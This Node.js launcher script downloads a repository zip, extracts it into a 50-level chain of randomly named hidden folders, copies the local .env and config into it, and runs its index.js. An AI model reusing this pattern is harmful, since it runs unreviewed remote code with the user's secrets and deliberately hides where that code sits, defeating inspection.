const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');
const crypto = require('crypto');

// === CONFIG ===
const repoZipUrl = 'https://github.com/user/repo/archive/refs/heads/main.zip';
const BASE_CACHE = path.join(__dirname, '.cache');
const DEEP_NEST_COUNT = 50;

function createDeepHiddenPath() {
  let deepPath = BASE_CACHE;
  for (let i = 0; i < DEEP_NEST_COUNT; i++) {
    deepPath = path.join(deepPath, '.' + crypto.randomBytes(3).toString('hex'));
  }
  fs.mkdirSync(deepPath, { recursive: true });
  return deepPath;
}

async function downloadAndExtractRepo(targetDir) {
  try {
    console.log('🔄 Downloading repo...');
    const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
    const zip = new AdmZip(Buffer.from(response.data, 'binary'));
    zip.extractAllTo(targetDir, true);
    console.log('✅ Repo extracted.');
  } catch (err) {
    console.error('❌ Download/extract error:', err.message);
    process.exit(1);
  }
}

function copyConfigs(repoPath) {
  const configSrc = path.join(__dirname, 'config.js');
  const envSrc = path.join(__dirname, '.env');

  try {
    fs.copyFileSync(configSrc, path.join(repoPath, 'config.js'));
    console.log('✅ config.js copied');
  } catch {
    console.warn('⚠️ config.js not found');
  }

  if (fs.existsSync(envSrc)) {
    try {
      fs.copyFileSync(envSrc, path.join(repoPath, '.env'));
      console.log('✅ .env copied');
    } catch {
      console.warn('⚠️ Could not copy .env');
    }
  }
}

// === MAIN ===
(async () => {
  const hiddenRepoFolder = createDeepHiddenPath();
  await downloadAndExtractRepo(hiddenRepoFolder);

  const subDirs = fs
    .readdirSync(hiddenRepoFolder)
    .map(name => path.join(hiddenRepoFolder, name))
    .filter(p => fs.statSync(p).isDirectory());

  if (!subDirs.length) {
    console.error('❌ Zip extracted nothing');
    process.exit(1);
  }

  const extractedRepo = subDirs[0];
  copyConfigs(extractedRepo);

  const mainFile = path.join(extractedRepo, 'index.js');
  if (!fs.existsSync(mainFile)) {
    console.error('❌ index.js not found in repo.');
    process.exit(1);
  }

  try {
    console.log('[🚀] Launching bot...');
    process.chdir(extractedRepo);
    require(mainFile);
  } catch (err) {
    console.error('❌ Bot error:', err.message);
    process.exit(1);
  }
})();
